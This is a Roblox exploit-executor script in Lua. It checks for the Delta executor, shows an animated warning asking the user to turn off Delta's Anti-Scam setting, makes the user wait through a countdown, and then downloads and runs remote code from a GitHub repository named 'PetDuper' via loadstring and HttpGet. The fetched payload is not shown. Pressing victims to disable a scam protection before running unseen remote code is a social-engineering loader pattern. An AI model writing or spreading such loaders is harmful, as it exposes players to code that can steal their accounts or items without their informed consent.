-- Delta Detection GUI (Delta-only, full features)
if not identifyexecutor or not identifyexecutor():lower():find("delta") then return end
local TweenService = game:GetService("TweenService")

local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "DeltaDetectGUI"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,480,0,320)
frame.Position = UDim2.new(0.5,-240,0.5,-160)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 1
frame.Parent = gui
Instance.new("UICorner",frame).CornerRadius = UDim.new(0,10)

local shadow = Instance.new("ImageLabel",frame)
shadow.Size = UDim2.new(1,30,1,30); shadow.Position = UDim2.new(0,-15,0,-15)
shadow.BackgroundTransparency = 1; shadow.Image = "rbxassetid://1316045217"
shadow.ImageTransparency = 1; shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10,10,118,118)

local title = Instance.new("TextLabel",frame)
title.Text="⚠️ Delta Executor Detected"; title.Font=Enum.Font.GothamBold
title.TextSize=24; title.TextColor3=Color3.fromRGB(255,100,100)
title.BackgroundTransparency=1; title.Size=UDim2.new(1,0,0,40)
title.Position=UDim2.new(0,0,0,10); title.TextTransparency=1

local msg = Instance.new("TextLabel",frame)
msg.Text="Please turn OFF Delta's Anti-Scam setting before proceeding.\nThis avoids script blocking."
msg.Font=Enum.Font.Gotham; msg.TextSize=16; msg.TextColor3=Color3.fromRGB(240,240,240)
msg.TextWrapped=true; msg.BackgroundTransparency=1
msg.Size=UDim2.new(1,-40,0,60); msg.Position=UDim2.new(0,20,0,60)
msg.TextTransparency=1

local timerLabel = Instance.new("TextLabel",frame)
timerLabel.Text="Waiting 10 seconds..."; timerLabel.Font=Enum.Font.GothamBold
timerLabel.TextSize=18; timerLabel.TextColor3=Color3.fromRGB(255,200,120)
timerLabel.BackgroundTransparency=1
timerLabel.Size=UDim2.new(1,0,0,30); timerLabel.Position=UDim2.new(0,0,0,125)
timerLabel.TextTransparency=1

local proceed = Instance.new("TextButton",frame)
proceed.Size=UDim2.new(0,200,0,45); proceed.Position=UDim2.new(0.5,-100,1,-110)
proceed.Text="🔒 Please Wait..."; proceed.Font=Enum.Font.GothamBold
proceed.TextSize=18; proceed.TextColor3=Color3.fromRGB(160,160,160)
proceed.BackgroundColor3=Color3.fromRGB(40,40,40)
proceed.AutoButtonColor=false; proceed.Active=false
proceed.BackgroundTransparency=1
Instance.new("UICorner",proceed).CornerRadius=UDim.new(0,8)

local note = Instance.new("TextLabel",frame)
note.Text="💡 If you want to change executor, click one of the buttons below:"
note.Font=Enum.Font.Gotham; note.TextSize=14
note.TextColor3=Color3.fromRGB(170,170,170)
note.BackgroundTransparency=1
note.Position=UDim2.new(0,0,1,-65); note.Size=UDim2.new(1,0,0,20)
note.TextTransparency=1

local krnl = Instance.new("TextButton",frame)
krnl.Size=UDim2.new(0,100,0,35); krnl.Position=UDim2.new(0.5,-110,1,-30)
krnl.Text="🔗 KRNL"; krnl.Font=Enum.Font.GothamBold; krnl.TextSize=16
krnl.TextColor3=Color3.fromRGB(255,255,255)
krnl.BackgroundColor3=Color3.fromRGB(30,30,30)
krnl.BackgroundTransparency=1
Instance.new("UICorner",krnl).CornerRadius=UDim.new(0,6)

local arceus = Instance.new("TextButton",frame)
arceus.Size=UDim2.new(0,100,0,35); arceus.Position=UDim2.new(0.5,10,1,-30)
arceus.Text="🔗 Arceus X"; arceus.Font=Enum.Font.GothamBold
arceus.TextSize=16; arceus.TextColor3=Color3.fromRGB(255,255,255)
arceus.BackgroundColor3=Color3.fromRGB(30,30,30)
arceus.BackgroundTransparency=1
Instance.new("UICorner",arceus).CornerRadius=UDim.new(0,6)

local function fadeIn(obj,d) task.delay(d or 0, function()
 TweenService:Create(obj,TweenInfo.new(0.5),{TextTransparency=0}):Play() end) end

TweenService:Create(frame,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
TweenService:Create(shadow,TweenInfo.new(0.4),{ImageTransparency=0.5}):Play()
TweenService:Create(proceed,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
TweenService:Create(krnl,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
TweenService:Create(arceus,TweenInfo.new(0.4),{BackgroundTransparency=0}):Play()
fadeIn(title,0.2); fadeIn(msg,0.4); fadeIn(timerLabel,0.6); fadeIn(note,1)

krnl.MouseButton1Click:Connect(function() setclipboard("https://krnl.place") end)
arceus.MouseButton1Click:Connect(function() setclipboard("https://arceusx.com") end)

task.spawn(function()
 for i=10,1,-1 do timerLabel.Text="Please wait "..i.."s..."; wait(1) end
 timerLabel.Text="✅ You may now proceed!"
 proceed.Text="✅ Proceed"; proceed.TextColor3=Color3.fromRGB(255,255,255)
 proceed.Active=true
 proceed.MouseButton1Click:Connect(function()
   local waitLabel=Instance.new("TextLabel",gui)
   waitLabel.Size=UDim2.new(1,0,0,40); waitLabel.Position=UDim2.new(0,0,0.9,0)
   waitLabel.BackgroundTransparency=1; waitLabel.TextColor3=Color3.fromRGB(255,255,255)
   waitLabel.Font=Enum.Font.GothamBold; waitLabel.TextSize=20
   return task.spawn(function()
     for j=3,1,-1 do
       waitLabel.Text="⏳ Please wait "..j.."s..."; wait(1)
     end
     gui:Destroy()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/GaGPS/PetDuper/refs/heads/main/Duper"))()
   end)
 end)
end)
